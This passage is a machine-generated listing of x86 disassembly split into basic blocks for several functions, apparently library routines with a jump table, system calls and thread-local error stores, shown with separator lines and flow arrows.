0xb10de01:	lea	edx, dword ptr [eax + 0x18]
0xb10de04:	mov	dword ptr [esp + 0x20], eax
0xb10de08:	add	eax, 0x1c
0xb10de0b:	mov	dword ptr [esp + 0x2c], eax
0xb10de0f:	mov	eax, dword ptr [esp + 0x50]
0xb10de13:	mov	dword ptr [esp + 0x24], ecx
0xb10de17:	mov	dword ptr [esp + 0x28], edx
0xb10de1b:	movzx	ecx, byte ptr [eax]
0xb10de1e:	movsx	eax, cl
0xb10de21:	mov	dword ptr [esp + 0x1c], eax
0xb10de25:	sub	eax, 0x30
0xb10de28:	cmp	eax, 9
0xb10de2b:	ja	0xb10de5d
None
|
|
|
v
0xb10e0a4:	mov	ecx, dword ptr [esp + 0x58]
0xb10e0a8:	mov	dword ptr [ecx], eax
0xb10e0aa:	jmp	0xb10dde4
None
|
|
|
v
0xb10e0ba:	mov	ebp, dword ptr [esp + 0x70]
0xb10e0be:	mov	eax, dword ptr [esp + 0x68]
0xb10e0c2:	test	ebp, ebp
0xb10e0c4:	mov	dword ptr [eax], 0xfffffffe
0xb10e0ca:	je	0xb10e0d6
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b11c720
TOTAL BLOCKS :4
0xb11c72d:	add	ebx, 0x8e8d3
0xb11c733:	mov	edx, dword ptr [esp + 0xc]
0xb11c737:	test	ecx, ecx
0xb11c739:	je	0xb11c750
None
|
|
|
v
0xb11c73b:	lea	esi, dword ptr [ecx + 7]
0xb11c73e:	and	ecx, 7
0xb11c741:	mov	eax, dword ptr [ebx + ecx*4 - 0x4b258]
0xb11c748:	shr	esi, 3
0xb11c74b:	add	eax, ebx
0xb11c74d:	jmp	eax
None
|
|
|
v
0xb11c750:	pop	ebx
0xb11c751:	pop	esi
0xb11c752:	ret	
None
|
|
|
v
0xb11c720:	push	esi
0xb11c721:	xor	eax, eax
0xb11c723:	push	ebx
0xb11c724:	mov	ecx, dword ptr [esp + 0x10]
0xb11c728:	call	0xb1267db
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b11d390
TOTAL BLOCKS :103
0xb11d607:	mov	ecx, dword ptr [ebp - 0x88]
0xb11d60d:	mov	esi, dword ptr [ebp - 0x8c]
0xb11d613:	add	esi, ecx
0xb11d615:	cmp	dword ptr [ebp - 0x44], 4
0xb11d619:	cmovne	esi, ecx
0xb11d61c:	mov	ecx, dword ptr [ebp - 0x78]
0xb11d61f:	mov	dword ptr [ebp - 0x88], esi
0xb11d625:	shl	ecx, 4
0xb11d628:	mov	dword ptr [ebp - 0x8c], ecx
0xb11d62e:	mov	ecx, dword ptr [ebp - 0x90]
0xb11d634:	lea	eax, dword ptr [eax + ecx + 0x18]
0xb11d638:	mov	ecx, eax
0xb11d63a:	mov	dword ptr [ebp - 0x90], eax
0xb11d640:	mov	eax, dword ptr [ebp - 0x88]
0xb11d646:	add	eax, dword ptr [ebp - 0x8c]
0xb11d64c:	cmp	ecx, eax
0xb11d64e:	jb	0xb11db45
None
|
|
|
v
0xb11d8e2:	mov	eax, dword ptr [ebp + 8]
0xb11d8e5:	mov	edx, dword ptr [eax]
0xb11d8e7:	mov	eax, dword ptr [ebp - 0x50]
0xb11d8ea:	cmp	byte ptr [edx + eax - 1], 0
0xb11d8ef:	jne	0xb11d979
None
|
|
|
v
0xb11d4d7:	cmp	dword ptr [ebp - 0x6c], -1
0xb11d4db:	je	0xb11db20
None
|
|
|
v
0xb11d8fc:	mov	eax, dword ptr [ebp + 8]
0xb11d8ff:	mov	esi, dword ptr [eax + 4]
0xb11d902:	mov	eax, dword ptr [ebp - 0x98]
0xb11d908:	mov	ecx, dword ptr [esi]
0xb11d90a:	mov	eax, dword ptr [eax]
0xb11d90c:	cmp	byte ptr [ecx + eax - 1], 0
0xb11d911:	jne	0xb11d979
None
|
|
|
v
0xb11d4b0:	mov	dword ptr [ebp - 0x5c], edx
0xb11d4b3:	and	edx, 1
0xb11d4b6:	jne	0xb11d4cc
None
|
|
|
v
0xb11d3e5:	mov	dword ptr [ebp - 0x74], 0
0xb11d3ec:	mov	edi, eax
0xb11d3ee:	cmp	edi, 0xff
0xb11d3f1:	je	0xb11d4e6
None
|
|
|
v
0xb11d998:	mov	edx, dword ptr [ebp - 0xa4]
0xb11d99e:	mov	dword ptr [ebp - 0x38], eax
0xb11d9a1:	mov	eax, dword ptr [ebp - 0xa0]
0xb11d9a7:	test	edx, edx
0xb11d9a9:	mov	dword ptr [ebp - 0x34], eax
0xb11d9ac:	jle	0xb11da70
None
|
|
|
v
0xb11d6f0:	mov	edx, dword ptr [ebp - 0x9c]
0xb11d6f6:	mov	eax, dword ptr [ebp + 8]
0xb11d6f9:	add	edx, dword ptr [ebp + 0xc]
0xb11d6fc:	mov	esi, dword ptr [ebp + 8]
0xb11d6ff:	mov	dword ptr [eax + 4], edx
0xb11d702:	mov	eax, dword ptr [ebp - 0xa4]
0xb11d708:	lea	ecx, dword ptr [edx + eax*4 + 4]
0xb11d70c:	mov	eax, dword ptr [ebp + 8]
0xb11d70f:	mov	edx, dword ptr [ebp - 0x84]
0xb11d715:	add	edx, dword ptr [ebp - 0xa0]
0xb11d71b:	mov	dword ptr [eax + 0x10], ecx
0xb11d71e:	mov	eax, dword ptr [ebp - 0x6c]
0xb11d721:	lea	eax, dword ptr [eax*4 + 4]
0xb11d728:	mov	dword ptr [ebp - 0xa8], eax
0xb11d72e:	add	eax, ecx
0xb11d730:	mov	dword ptr [esi], eax
0xb11d732:	add	eax, edx
0xb11d734:	mov	dword ptr [ebp - 0x9c], eax
0xb11d73a:	mov	eax, dword ptr [ebp - 0x70]
0xb11d73d:	and	eax, 0xfffffffd
0xb11d740:	cmp	eax, 4
0xb11d743:	sete	byte ptr [ebp - 0xa9]
0xb11d74a:	je	0xb11d960
None
|
|
|
v
0xb11d6c6:	mov	eax, dword ptr [ebp + 0x18]
0xb11d6c9:	mov	edx, dword ptr gs:[0]
0xb11d6d0:	mov	dword ptr [ebp - 0x6c], 0x22
0xb11d6d7:	mov	dword ptr [eax], 0xffffffff
0xb11d6dd:	mov	eax, dword ptr [ebx - 0xdc]
0xb11d6e3:	mov	dword ptr [edx + eax], 0x22
0xb11d6ea:	jmp	0xb11d58c
None
|
|
|
v
0xb11d5b8:	mov	dword ptr [esp], edi
0xb11d5bb:	call	0xb11fb80
None
|
|
|
v
0xb11d938:	add	eax, 1
0xb11d93b:	cmp	eax, ecx
0xb11d93d:	jne	0xb11d928
None
|
|
|
v
0xb11d498:	lock sub	dword ptr [edi + 0xc], 1
None
|
|
|
v
0xb11da0b:	lea	eax, dword ptr [ebp - 0x38]
0xb11da0e:	mov	dword ptr [esp + 4], eax
0xb11da12:	mov	eax, dword ptr [ebp - 0x78]
0xb11da15:	mov	dword ptr [esp + 8], ecx
0xb11da19:	mov	dword ptr [esp], eax
0xb11da1c:	call	0xb11f9c0
None
|
|
|
v
0xb11d39b:	add	ebx, 0x8dc65
0xb11d3a1:	sub	esp, 0xbc
0xb11d3a7:	mov	dword ptr [ebp - 0x7c], eax
0xb11d3aa:	mov	dword ptr [ebp - 0x80], edx
0xb11d3ad:	mov	dword ptr [ebp - 0x70], ecx
0xb11d3b0:	mov	eax, dword ptr [ebx + 0x3a5c]
0xb11d3b6:	test	eax, eax
0xb11d3b8:	jns	0xb11db8c
None
|
|
|
v
0xb11d945:	mov	eax, dword ptr [ebp + 0x14]
0xb11d948:	mov	ecx, dword ptr [ebp + 8]
0xb11d94b:	mov	dword ptr [ebp - 0x6c], 0
0xb11d952:	mov	dword ptr [eax], ecx
0xb11d954:	jmp	0xb11d58c
None
|
|
|
v
0xb11da5b:	cmp	eax, esi
0xb11da5d:	je	0xb11d945
None
|
|
|
v
0xb11d973:	mov	edi, dword ptr [ebp - 0x84]
0xb11d979:	mov	eax, dword ptr [edi]
0xb11d97b:	mov	eax, dword ptr [eax + 8]
0xb11d97e:	cmp	eax, dword ptr [ebp - 0x5c]
0xb11d981:	je	0xb11da63
None
|
|
|
v
0xb11d913:	mov	dword ptr [ebp - 0x84], edi
0xb11d919:	xor	eax, eax
0xb11d91b:	mov	ecx, edx
0xb11d91d:	mov	edi, dword ptr [ebp - 0x98]
0xb11d923:	mov	dword ptr [ebp - 0x6c], esi
0xb11d926:	jmp	0xb11d938
None
|
|
|
v
0xb11d4e1:	mov	edi, 0xffffffff
0xb11d4e6:	lea	eax, dword ptr [ebp - 0x58]
0xb11d4e9:	mov	dword ptr [esp + 0xc], eax
0xb11d4ed:	mov	eax, dword ptr [ebp - 0x70]
0xb11d4f0:	mov	dword ptr [esp + 0x10], 0x20
0xb11d4f8:	mov	dword ptr [esp + 8], eax
0xb11d4fc:	mov	eax, dword ptr [ebp - 0x80]
0xb11d4ff:	mov	dword ptr [esp + 4], eax
0xb11d503:	mov	eax, dword ptr [ebp - 0x7c]
0xb11d506:	mov	dword ptr [esp], eax
0xb11d509:	call	0xb1202d0
None
|
|
|
v
0xb11d7ed:	mov	eax, dword ptr [ebp + 8]
0xb11d7f0:	mov	ecx, dword ptr [ebp - 0x8c]
0xb11d7f6:	mov	eax, dword ptr [eax + 0x10]
0xb11d7f9:	mov	eax, dword ptr [eax]
0xb11d7fb:	mov	dword ptr [esp + 8], ecx
0xb11d7ff:	mov	ecx, dword ptr [ebp - 0x88]
0xb11d805:	mov	dword ptr [esp], eax
0xb11d808:	mov	dword ptr [esp + 4], ecx
0xb11d80c:	call	0xb07d0b0
None
|
|
|
v
0xb11db8e:	mov	dword ptr [ebx + 0x3a58], 1
0xb11db98:	mov	eax, 0xffffffff
0xb11db9d:	jmp	0xb11d4a6
None
|
|
|
v
0xb11d8f5:	mov	edx, dword ptr [ebp - 0x4c]
0xb11d8f8:	test	edx, edx
0xb11d8fa:	jle	0xb11d945
None
|
|
|
v
0xb11d4b8:	add	dword ptr [ebp - 0x74], 1
0xb11d4bc:	cmp	dword ptr [ebp - 0x74], 5
0xb11d4c0:	je	0xb11d4cc
None
|
|
|
v
0xb11d4d1:	je	0xb11db08
None
|
|
|
v
0xb11d4a3:	mov	eax, dword ptr [ebp - 0x6c]
0xb11d4a6:	lea	esp, dword ptr [ebp - 0xc]
0xb11d4a9:	pop	ebx
0xb11d4aa:	pop	esi
0xb11d4ab:	pop	edi
0xb11d4ac:	pop	ebp
0xb11d4ad:	ret	0x14
None
|
|
|
v
0xb11d9b2:	shl	edx, 2
0xb11d9b5:	mov	ecx, 3
0xb11d9ba:	lea	eax, dword ptr [edx + 0x1e]
0xb11d9bd:	and	eax, 0xfffffff0
0xb11d9c0:	sub	esp, eax
0xb11d9c2:	lea	eax, dword ptr [esp + 0x23]
0xb11d9c6:	and	eax, 0xfffffff0
0xb11d9c9:	add	dword ptr [ebp - 0xa0], edx
0xb11d9cf:	cmp	byte ptr [ebp - 0xa9], 0
0xb11d9d6:	mov	dword ptr [ebp - 0x2c], edx
0xb11d9d9:	mov	edx, 2
0xb11d9de:	mov	dword ptr [ebp - 0x98], eax
0xb11d9e4:	mov	dword ptr [ebp - 0x30], eax
0xb11d9e7:	je	0xb11da87
None
|
|
|
v
0xb11d9ed:	mov	eax, dword ptr [ebp + 8]
0xb11d9f0:	mov	esi, dword ptr [ebp - 0xa0]
0xb11d9f6:	mov	eax, dword ptr [eax + 0x10]
0xb11d9f9:	mov	eax, dword ptr [eax]
0xb11d9fb:	mov	dword ptr [ebp + edx*8 - 0x38], eax
0xb11d9ff:	mov	eax, dword ptr [ebp - 0x6c]
0xb11da02:	shl	eax, 2
0xb11da05:	mov	dword ptr [ebp + edx*8 - 0x34], eax
0xb11da09:	add	esi, eax
0xb11da0b:	lea	eax, dword ptr [ebp - 0x38]
0xb11da0e:	mov	dword ptr [esp + 4], eax
0xb11da12:	mov	eax, dword ptr [ebp - 0x78]
0xb11da15:	mov	dword ptr [esp + 8], ecx
0xb11da19:	mov	dword ptr [esp], eax
0xb11da1c:	call	0xb11f9c0
None
|
|
|
v
0xb11d761:	mov	eax, dword ptr [ebp - 0x6c]
0xb11d764:	test	eax, eax
0xb11d766:	jle	0xb11dac6
None
|
|
|
v
0xb11da30:	jmp	0xb11d811
None
|
|
|
v
0xb11d987:	mov	dword ptr [ebp - 0x6c], 0xfffffffe
0xb11d98e:	jmp	0xb11d58c
None
|
|
|
v
0xb11dad6:	mov	eax, dword ptr [ebp - 0x6c]
0xb11dad9:	lea	esi, dword ptr [eax*4]
0xb11dae0:	lea	eax, dword ptr [esi + 0x1e]
0xb11dae3:	and	eax, 0xfffffff0
0xb11dae6:	sub	esp, eax
0xb11dae8:	lea	eax, dword ptr [esp + 0x23]
0xb11daec:	and	eax, 0xfffffff0
0xb11daef:	mov	dword ptr [ebp + edx*8 - 0x38], eax
0xb11daf3:	mov	dword ptr [ebp + edx*8 - 0x34], esi
0xb11daf7:	mov	edx, ecx
0xb11daf9:	add	ecx, 1
0xb11dafc:	add	dword ptr [ebp - 0xa0], esi
0xb11db02:	jmp	0xb11da8d
None
|
|
|
v
0xb11d89e:	mov	eax, dword ptr [ebp + 0xc]
0xb11d8a1:	add	eax, dword ptr [ebp + 0x10]
0xb11d8a4:	cmp	dword ptr [ebp - 0x9c], eax
0xb11d8aa:	ja	0xb11db51
None
|
|
|
v
0xb11d811:	mov	ecx, dword ptr [ebp - 0x4c]
0xb11d814:	test	ecx, ecx
0xb11d816:	jle	0xb11dacd
None
|
|
|
v
0xb11dacd:	xor	ecx, ecx
0xb11dacf:	xor	esi, esi
0xb11dad1:	jmp	0xb11d877
None
|
|
|
v
0xb11d48b:	mov	eax, dword ptr [ebp - 0x84]
0xb11d491:	mov	edx, dword ptr [edx + 8]
0xb11d494:	cmp	edx, eax
0xb11d496:	jne	0xb11d4b0
None
|
|
|
v
0xb11da40:	mov	eax, dword ptr [ebp + 8]
0xb11da43:	mov	dword ptr [esp + 8], esi
0xb11da47:	mov	eax, dword ptr [eax + 4]
0xb11da4a:	mov	eax, dword ptr [eax]
0xb11da4c:	mov	dword ptr [esp + 4], eax
0xb11da50:	mov	eax, dword ptr [ebp - 0x78]
0xb11da53:	mov	dword ptr [esp], eax
0xb11da56:	call	0xb11f920
None
|
|
|
v
0xb11d928:	mov	edx, dword ptr [ebp - 0x6c]
0xb11d92b:	mov	esi, dword ptr [edi + eax*4]
0xb11d92e:	mov	edx, dword ptr [edx + eax*4]
0xb11d931:	cmp	byte ptr [edx + esi - 1], 0
0xb11d936:	jne	0xb11d973
None
|
|
|
v
0xb11d4a6:	lea	esp, dword ptr [ebp - 0xc]
0xb11d4a9:	pop	ebx
0xb11d4aa:	pop	esi
0xb11d4ab:	pop	edi
0xb11d4ac:	pop	ebp
0xb11d4ad:	ret	0x14
None
|
|
|
v
0xb11d5c8:	lea	esi, dword ptr [eax + 0x38]
0xb11d5cb:	mov	ecx, esi
0xb11d5cd:	mov	dword ptr [ebp - 0x94], esi
0xb11d5d3:	mov	esi, dword ptr [ebp - 0x88]
0xb11d5d9:	add	esi, ecx
0xb11d5db:	mov	ecx, dword ptr [ebp - 0x8c]
0xb11d5e1:	mov	dword ptr [ebp - 0x98], esi
0xb11d5e7:	lea	esi, dword ptr [esi + ecx*4]
0xb11d5ea:	mov	dword ptr [ebp - 0x88], esi
0xb11d5f0:	mov	esi, dword ptr [ebp - 0x78]
0xb11d5f3:	shl	esi, 2
0xb11d5f6:	mov	dword ptr [ebp - 0x8c], esi
0xb11d5fc:	mov	esi, dword ptr [ebp - 0x70]
0xb11d5ff:	and	esi, 0xfffffffd
0xb11d602:	cmp	esi, 4
0xb11d605:	je	0xb11d62e
None
|
|
|
v
0xb11dab0:	mov	dword ptr [ebx + 0x3a58], 1
0xb11daba:	mov	dword ptr [ebp - 0x6c], 0xffffffff
0xb11dac1:	jmp	0xb11d5a4
None
|
|
|
v
0xb11db87:	jmp	0xb11da63
None
|
|
|
v
0xb11d8be:	mov	eax, dword ptr [ebp + 8]
0xb11d8c1:	mov	edx, dword ptr [ebp - 0x88]
0xb11d8c7:	add	edx, dword ptr [ebp - 0x8c]
0xb11d8cd:	mov	eax, dword ptr [eax + 4]
0xb11d8d0:	mov	eax, dword ptr [eax]
0xb11d8d2:	mov	dword ptr [esp + 4], edx
0xb11d8d6:	mov	dword ptr [esp + 8], esi
0xb11d8da:	mov	dword ptr [esp], eax
0xb11d8dd:	call	0xb07d0b0
None
|
|
|
v
0xb11d594:	xchg	ebx, ecx
0xb11d596:	mov	eax, 6
0xb11d59b:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb11d49d:	je	0xb11d5b8
None
|
|
|
v
0xb11db45:	mov	dword ptr [ebp - 0x6c], 0xffffffff
0xb11db4c:	jmp	0xb11d48b
None
|
|
|
v
0xb11db08:	mov	dword ptr [esp], edi
0xb11db0b:	call	0xb11fb80
None
|
|
|
v
0xb11d51a:	mov	dword ptr [ebp - 0x90], 0xffffffff
0xb11d524:	mov	dword ptr [ebp - 0x8c], 0
0xb11d52e:	mov	dword ptr [ebp - 0x88], 0
0xb11d538:	mov	dword ptr [ebp - 0x98], 0
0xb11d542:	mov	dword ptr [ebp - 0x94], 0
0xb11d54c:	mov	eax, dword ptr [ebp + 0x14]
0xb11d54f:	mov	dword ptr [eax], 0
0xb11d555:	mov	eax, dword ptr [ebp - 0x54]
0xb11d558:	cmp	eax, 0xff
0xb11d55b:	je	0xb11db2f
None
|
|
|
v
0xb11d3ee:	cmp	edi, 0xff
0xb11d3f1:	je	0xb11d4e6
None
|
|
|
v
0xb11dba2:	lea	eax, dword ptr [ebx - 0x475c6]
0xb11dba8:	mov	dword ptr [esp], eax
0xb11dbab:	call	0xb032860
None
|
|
|
v
0xb11db51:	mov	edx, dword ptr [ebp - 0x88]
0xb11db57:	test	edx, edx
0xb11db59:	je	0xb11d6c6
None
|
|
|
v
0xb11d5a2:	xchg	ebx, ecx
0xb11d5a4:	cmp	edi, 0xff
0xb11d5a7:	je	0xb11d4a3
None
|
|
|
v
0xb11d58c:	mov	ecx, dword ptr [ebp - 0x78]
0xb11d58f:	cmp	ecx, 0xff
0xb11d592:	je	0xb11d5a4
None
|
|
|
v
0xb11d54c:	mov	eax, dword ptr [ebp + 0x14]
0xb11d54f:	mov	dword ptr [eax], 0
0xb11d555:	mov	eax, dword ptr [ebp - 0x54]
0xb11d558:	cmp	eax, 0xff
0xb11d55b:	je	0xb11db2f
None
|
|
|
v
0xb11d41c:	test	eax, eax
0xb11d41e:	je	0xb11d4e6
None
|
|
|
v
0xb11da70:	cmp	byte ptr [ebp - 0xa9], 0
0xb11da77:	mov	ecx, 2
0xb11da7c:	mov	edx, 1
0xb11da81:	jne	0xb11d9ed
None
|
|
|
v
0xb11db1a:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb11db8c:	je	0xb11dba2
None
|
|
|
v
0xb11d3f7:	mov	eax, dword ptr [ebp - 0x80]
0xb11d3fa:	mov	dword ptr [esp + 0x10], 0x20
0xb11d402:	mov	dword ptr [esp + 0xc], edi
0xb11d406:	mov	dword ptr [esp + 8], eax
0xb11d40a:	mov	eax, dword ptr [ebp - 0x7c]
0xb11d40d:	mov	dword ptr [esp + 4], eax
0xb11d411:	mov	eax, dword ptr [ebp - 0x70]
0xb11d414:	mov	dword ptr [esp], eax
0xb11d417:	call	0xb120160
None
|
|
|
v
0xb11d660:	mov	edx, dword ptr [ebp + 0xc]
0xb11d663:	mov	eax, dword ptr [ebp - 0x50]
0xb11d666:	mov	ecx, dword ptr [ebp + 0xc]
0xb11d669:	mov	esi, dword ptr [ebp - 0x40]
0xb11d66c:	neg	edx
0xb11d66e:	and	edx, 3
0xb11d671:	mov	dword ptr [ebp - 0xa0], eax
0xb11d677:	add	eax, edx
0xb11d679:	add	ecx, eax
0xb11d67b:	neg	ecx
0xb11d67d:	and	ecx, 3
0xb11d680:	cmp	dword ptr [ebp - 0x70], 2
0xb11d684:	mov	dword ptr [ebp - 0x6c], esi
0xb11d687:	mov	esi, 0x10
0xb11d68c:	mov	dword ptr [ebp - 0x84], ecx
0xb11d692:	mov	ecx, 4
0xb11d697:	cmovne	ecx, esi
0xb11d69a:	mov	esi, dword ptr [ebp - 0x4c]
0xb11d69d:	mov	dword ptr [ebp - 0x9c], edx
0xb11d6a3:	imul	ecx, dword ptr [ebp - 0x6c]
0xb11d6a7:	mov	edx, esi
0xb11d6a9:	mov	dword ptr [ebp - 0xa4], esi
0xb11d6af:	mov	esi, dword ptr [ebp - 0x6c]
0xb11d6b2:	lea	esi, dword ptr [esi + edx + 2]
0xb11d6b6:	lea	eax, dword ptr [eax + esi*4]
0xb11d6b9:	add	eax, dword ptr [ebp - 0x84]
0xb11d6bf:	add	ecx, eax
0xb11d6c1:	cmp	ecx, dword ptr [ebp + 0x10]
0xb11d6c4:	jbe	0xb11d6f0
None
|
|
|
v
0xb11db79:	mov	ecx, dword ptr [ebp - 0x88]
0xb11db7f:	test	ecx, ecx
0xb11db81:	jne	0xb11d979
None
|
|
|
v
0xb11db74:	jmp	0xb11d6c6
None
|
|
|
v
0xb11d979:	mov	eax, dword ptr [edi]
0xb11d97b:	mov	eax, dword ptr [eax + 8]
0xb11d97e:	cmp	eax, dword ptr [ebp - 0x5c]
0xb11d981:	je	0xb11da63
None
|
|
|
v
0xb11d3be:	lea	eax, dword ptr [ebp - 0x5c]
0xb11d3c1:	mov	dword ptr [esp + 0xc], eax
0xb11d3c5:	lea	eax, dword ptr [ebx + 0x3a60]
0xb11d3cb:	mov	dword ptr [esp + 8], eax
0xb11d3cf:	lea	eax, dword ptr [ebx - 0x48d11]
0xb11d3d5:	mov	dword ptr [esp + 4], eax
0xb11d3d9:	mov	dword ptr [esp], 0xd
0xb11d3e0:	call	0xb120040
None
|
|
|
v
0xb11d5a4:	cmp	edi, 0xff
0xb11d5a7:	je	0xb11d4a3
None
|
|
|
v
0xb11db20:	lea	esp, dword ptr [ebp - 0xc]
0xb11db23:	mov	eax, 0xffffffff
0xb11db28:	pop	ebx
0xb11db29:	pop	esi
0xb11db2a:	pop	edi
0xb11db2b:	pop	ebp
0xb11db2c:	ret	0x14
None
|
|
|
v
0xb11d750:	mov	eax, dword ptr [ebp + 8]
0xb11d753:	mov	dword ptr [eax + 8], 0xa
0xb11d75a:	mov	dword ptr [eax + 0xc], 0x10
0xb11d761:	mov	eax, dword ptr [ebp - 0x6c]
0xb11d764:	test	eax, eax
0xb11d766:	jle	0xb11dac6
None
|
|
|
v
0xb11d4cc:	lock sub	dword ptr [edi + 0xc], 1
None
|
|
|
v
0xb11d62e:	mov	ecx, dword ptr [ebp - 0x90]
0xb11d634:	lea	eax, dword ptr [eax + ecx + 0x18]
0xb11d638:	mov	ecx, eax
0xb11d63a:	mov	dword ptr [ebp - 0x90], eax
0xb11d640:	mov	eax, dword ptr [ebp - 0x88]
0xb11d646:	add	eax, dword ptr [ebp - 0x8c]
0xb11d64c:	cmp	ecx, eax
0xb11d64e:	jb	0xb11db45
None
|
|
|
v
0xb11db2f:	mov	dword ptr [ebx + 0x3a58], 1
0xb11db39:	mov	dword ptr [ebp - 0x6c], 0xffffffff
0xb11db40:	jmp	0xb11d58c
None
|
|
|
v
0xb11d654:	mov	dword ptr [ebp - 0x78], 0xffffffff
0xb11d65b:	jmp	0xb11d54c
None
|
|
|
v
0xb11d862:	mov	edi, dword ptr [ebp - 0x94]
0xb11d868:	mov	esi, dword ptr [ebp - 0x6c]
0xb11d86b:	mov	ecx, dword ptr [ebp - 0x84]
0xb11d871:	mov	dword ptr [ebp - 0x9c], edx
0xb11d877:	mov	eax, dword ptr [ebp + 8]
0xb11d87a:	mov	eax, dword ptr [eax + 4]
0xb11d87d:	mov	dword ptr [eax + ecx], 0
0xb11d884:	mov	eax, dword ptr [ebp - 0x8c]
0xb11d88a:	add	eax, esi
0xb11d88c:	add	eax, dword ptr [ebp - 0x88]
0xb11d892:	cmp	dword ptr [ebp - 0x90], eax
0xb11d898:	jb	0xb11db79
None
|
|
|
v
0xb11d424:	mov	edx, dword ptr [eax + 0x18]
0xb11d427:	mov	dword ptr [ebp - 0x6c], 0xfffffffe
0xb11d42e:	mov	dword ptr [ebp - 0x58], edx
0xb11d431:	mov	edx, dword ptr [eax + 0x1c]
0xb11d434:	mov	dword ptr [ebp - 0x54], edx
0xb11d437:	mov	esi, dword ptr [eax + 0x20]
0xb11d43a:	mov	dword ptr [ebp - 0x50], esi
0xb11d43d:	mov	ecx, dword ptr [eax + 0x24]
0xb11d440:	mov	dword ptr [ebp - 0x88], esi
0xb11d446:	mov	esi, dword ptr [eax + 4]
0xb11d449:	mov	dword ptr [ebp - 0x4c], ecx
0xb11d44c:	mov	edx, dword ptr [eax + 0x28]
0xb11d44f:	mov	dword ptr [ebp - 0x90], esi
0xb11d455:	mov	dword ptr [ebp - 0x8c], ecx
0xb11d45b:	mov	dword ptr [ebp - 0x48], edx
0xb11d45e:	mov	edx, dword ptr [eax + 0x2c]
0xb11d461:	mov	dword ptr [ebp - 0x44], edx
0xb11d464:	mov	edx, dword ptr [eax + 0x30]
0xb11d467:	mov	dword ptr [ebp - 0x78], edx
0xb11d46a:	mov	dword ptr [ebp - 0x40], edx
0xb11d46d:	mov	edx, dword ptr [eax + 0x34]
0xb11d470:	mov	dword ptr [ebp - 0x3c], edx
0xb11d473:	mov	edx, dword ptr [edi]
0xb11d475:	mov	esi, dword ptr [edx + 8]
0xb11d478:	mov	ecx, esi
0xb11d47a:	mov	esi, dword ptr [ebp - 0x5c]
0xb11d47d:	cmp	ecx, esi
0xb11d47f:	mov	dword ptr [ebp - 0x84], esi
0xb11d485:	je	0xb11d5c8
None
|
|
|
v
0xb11d491:	mov	edx, dword ptr [edx + 8]
0xb11d494:	cmp	edx, eax
0xb11d496:	jne	0xb11d4b0
None
|
|
|
v
0xb11d4c2:	cmp	dword ptr [ebp - 0x6c], -1
0xb11d4c6:	jne	0xb11d3ee
None
|
|
|
v
0xb11d5c0:	jmp	0xb11d4a3
None
|
|
|
v
0xb11db5f:	mov	eax, dword ptr [edi]
0xb11db61:	mov	dword ptr [ebp - 0x6c], 0xfffffffe
0xb11db68:	mov	eax, dword ptr [eax + 8]
0xb11db6b:	cmp	eax, dword ptr [ebp - 0x5c]
0xb11db6e:	jne	0xb11d58c
None
|
|
|
v
0xb11d848:	mov	ecx, dword ptr [edi + 4]
0xb11d84b:	mov	dword ptr [ecx + eax], edx
0xb11d84e:	mov	ecx, dword ptr [esi + eax]
0xb11d851:	add	edx, dword ptr [esi + eax]
0xb11d854:	add	eax, 4
0xb11d857:	add	dword ptr [ebp - 0x6c], ecx
0xb11d85a:	cmp	eax, dword ptr [ebp - 0x84]
0xb11d860:	jne	0xb11d848
None
|
|
|
v
0xb11da38:	test	esi, esi
0xb11da3a:	je	0xb11d945
None
|
|
|
v
0xb11db10:	cmp	dword ptr [ebp - 0x6c], -1
0xb11db14:	jne	0xb11d4e1
None
|
|
|
v
0xb11d56a:	mov	eax, dword ptr [ebp - 0x3c]
0xb11d56d:	mov	ecx, dword ptr [ebp + 0x18]
0xb11d570:	mov	dword ptr [ebp - 0x6c], 0
0xb11d577:	mov	dword ptr [ecx], eax
0xb11d579:	mov	eax, dword ptr gs:[0]
0xb11d57f:	mov	ecx, dword ptr [ebx - 0xdc]
0xb11d585:	mov	dword ptr [eax + ecx], 0
0xb11d58c:	mov	ecx, dword ptr [ebp - 0x78]
0xb11d58f:	cmp	ecx, 0xff
0xb11d592:	je	0xb11d5a4
None
|
|
|
v
0xb11da87:	cmp	dword ptr [ebp - 0x44], 4
0xb11da8b:	je	0xb11dad6
None
|
|
|
v
0xb11d76c:	mov	eax, dword ptr [ebp + 8]
0xb11d76f:	mov	dword ptr [ebp - 0x84], edi
0xb11d775:	mov	edx, dword ptr [ebp - 0x9c]
0xb11d77b:	mov	edi, dword ptr [ebp + 8]
0xb11d77e:	mov	esi, dword ptr [eax + 0xc]
0xb11d781:	xor	eax, eax
0xb11d783:	jmp	0xb11d78b
None
|
|
|
v
0xb11d93f:	mov	edi, dword ptr [ebp - 0x84]
0xb11d945:	mov	eax, dword ptr [ebp + 0x14]
0xb11d948:	mov	ecx, dword ptr [ebp + 8]
0xb11d94b:	mov	dword ptr [ebp - 0x6c], 0
0xb11d952:	mov	dword ptr [eax], ecx
0xb11d954:	jmp	0xb11d58c
None
|
|
|
v
0xb11da21:	mov	dword ptr [ebp - 0x6c], 0xffffffff
0xb11da28:	cmp	eax, esi
0xb11da2a:	jne	0xb11d58c
None
|
|
|
v
0xb11d561:	cmp	eax, 1
0xb11d564:	je	0xb11d660
None
|
|
|
v
0xb11d7b7:	mov	esi, dword ptr [ebp - 0x94]
0xb11d7bd:	mov	dword ptr [ecx + eax], 0
0xb11d7c4:	mov	eax, dword ptr [ebp + 8]
0xb11d7c7:	test	esi, esi
0xb11d7c9:	mov	eax, dword ptr [eax]
0xb11d7cb:	je	0xb11d998
None
|
|
|
v
0xb11d8b0:	mov	eax, dword ptr [ebp - 0x88]
0xb11d8b6:	test	eax, eax
0xb11d8b8:	je	0xb11da38
None
|
|
|
v
0xb11d788:	mov	ecx, dword ptr [edi + 0x10]
0xb11d78b:	mov	dword ptr [ecx + eax*4], edx
0xb11d78e:	add	edx, esi
0xb11d790:	add	eax, 1
0xb11d793:	cmp	eax, dword ptr [ebp - 0x6c]
0xb11d796:	jne	0xb11d788
None
|
|
|
v
0xb11d78b:	mov	dword ptr [ecx + eax*4], edx
0xb11d78e:	add	edx, esi
0xb11d790:	add	eax, 1
0xb11d793:	cmp	eax, dword ptr [ebp - 0x6c]
0xb11d796:	jne	0xb11d788
None
|
|
|
v
0xb11d390:	push	ebp
0xb11d391:	mov	ebp, esp
0xb11d393:	push	edi
0xb11d394:	push	esi
